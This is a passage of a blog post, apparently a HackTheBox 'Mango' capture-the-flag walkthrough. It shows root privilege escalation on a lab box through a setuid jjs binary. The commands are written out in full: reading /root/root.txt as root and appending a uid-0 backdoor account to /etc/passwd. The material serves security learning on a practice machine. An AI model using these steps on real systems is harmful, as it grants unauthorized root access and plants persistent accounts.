+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@mango:/$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+</code></pre></div><p>This <code>jjs</code>  binary catch my eye because it&rsquo;s not common to see it having the setuid bit. If you wonder what <code>jjs</code> stands for, it stands for <strong>J</strong>ava <strong>J</strong>ava<strong>S</strong>cript.</p>
+<h3 id="jjs-setuid-exploitation">jjs setuid exploitation</h3>
+<p>Let&rsquo;s search online to see if we can do something with this <code>jjs</code> binary. My favorite resource is <a href="https://gtfobins.github.io/"><code>GTFOBins</code></a>.</p>
+<blockquote>
+<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+</blockquote>
+<p>According to it, <code>jjs</code> could be used to execute commands, read and write file. Sounds incredibly useful for us especially since the setuid is set meaning the command will be ran as <code>root</code>.</p>
+<p>Let&rsquo;s give it a try to read the <code>root.txt</code> flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@mango:/$ echo <span style="color:#e6db74">&#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;);
+</span><span style="color:#e6db74">&gt; var FileReader = Java.type(&#34;java.io.FileReader&#34;);
+</span><span style="color:#e6db74">&gt; var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;));
+</span><span style="color:#e6db74">&gt; while ((line = br.readLine()) != null) { print(line); }&#39;</span> | jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs&gt; var BufferedReader <span style="color:#f92672">=</span> Java.type<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.io.BufferedReader&#34;</span><span style="color:#f92672">)</span>;
+jjs&gt; var FileReader <span style="color:#f92672">=</span> Java.type<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.io.FileReader&#34;</span><span style="color:#f92672">)</span>;
+jjs&gt; var br <span style="color:#f92672">=</span> new BufferedReader<span style="color:#f92672">(</span>new FileReader<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/root/root.txt&#34;</span><span style="color:#f92672">))</span>;
+jjs&gt; <span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>line <span style="color:#f92672">=</span> br.readLine<span style="color:#f92672">())</span> !<span style="color:#f92672">=</span> null<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> print<span style="color:#f92672">(</span>line<span style="color:#f92672">)</span>; <span style="color:#f92672">}</span>
+8xxxxxxxxxxxxxxxxxxxxxx5
+</code></pre></div><p>So we got the root flag! But this not fun enough right ? It would be better to login as root.</p>
+<p>To do so I am going to show an alternative method from the usual SSH key retrieval/adding I usually use.</p>
+<p>This time we are going to add a new root account to the box by adding a new line to the <code>/etc/passwd</code> file.</p>
+<p>First let&rsquo;s generate the hash of our password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@mango:/$ openssl passwd -1
+Password:
+Verifying - Password:
+$1$3H6dixbQ$xxxxxxxxxxxxj7TueW/J.
+</code></pre></div><p>We are going to add a new user called <code>hg8</code> with the the uid <code>0</code> (to be root) to the <code>passwd</code> file with the following line:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hg8:$1$3H6dixbQ$xxxxxxxxxxxxj7TueW/J.:0:0:root:/root:/bin/bash
+</code></pre></div><p>Now let&rsquo;s use the <code>jjs</code> binary to write to <code>/etc/passwd</code> file as root, let&rsquo;s tweak the example shown on <a href="https://gtfobins.github.io/"><code>GTFOBins</code></a> to append data to a file instead of creating a new one and let&rsquo;s go:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@mango:/$ jjs
+jjs&gt; var FileWriter <span style="color:#f92672">=</span> Java.type<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.io.FileWriter&#34;</span><span style="color:#f92672">)</span>;
+jjs&gt; var fw<span style="color:#f92672">=</span>new FileWriter<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, true<span style="color:#f92672">)</span>;
+jjs&gt; fw.write<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hg8:</span>$1$3<span style="color:#e6db74">H6dixbQ</span>$xxxxxxxxxxxxj7TueW<span style="color:#e6db74">/J.:0:0:root:/root:/bin/bash\n&#34;</span><span style="color:#f92672">)</span>;
+jjs&gt; fw.close<span style="color:#f92672">()</span>;
+jjs&gt; 
+admin@mango:/home/admin$ 
+</code></pre></div><p>Let&rsquo;s verify it worked and login as our new user :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin@mango:/$ cat /etc/passwd
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+hg8:$1$/k0hFNSh$HKqgKcpLRBVVv8bY1wfv3.:0:0:root:/root:/bin/bash
+admin@mango:/$ su - hg8
+Password:
+root@mango:~# id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+root@mango:~# cat root.txt
+8xxxxxxxxxxxxxxxxxxxxxxxxxxx5
+</code></pre></div><p>Now that we are root and done let&rsquo;s not forget to clean up our changes to not spoil other users!</p>
+<hr>
+<p>As always do not hesitate to contact me for any questions or feedbacks ;)</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/traverxec/">
+                  <span class="button__text">Traverxec - HackTheBox</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        <br><br>
+<script src="https://utteranc.es/client.js"
+        repo="hg8/hg8.github.io"
+        issue-term="pathname"
+        label="💬 Comment"
+        theme="photon-dark"
+        crossorigin="anonymous"
+        async>
+</script>
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="footer__content">
+        <span>© 2020</span>
+        <span><a href="https://hg8.sh" target="_blank" rel="noopener">hg8.sh</a></span>
+        <span>
+          &nbsp; 
+          <a class="social-icon" href="https://twitter.com/_hg8_" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
+          &nbsp; 
+          <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
+          &nbsp;
+          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
+          &nbsp; 
+          <a class="social-icon" href="https://hg8.sh/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+        </span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+      
+    </div>
+
+    
+  </body>
+</html>
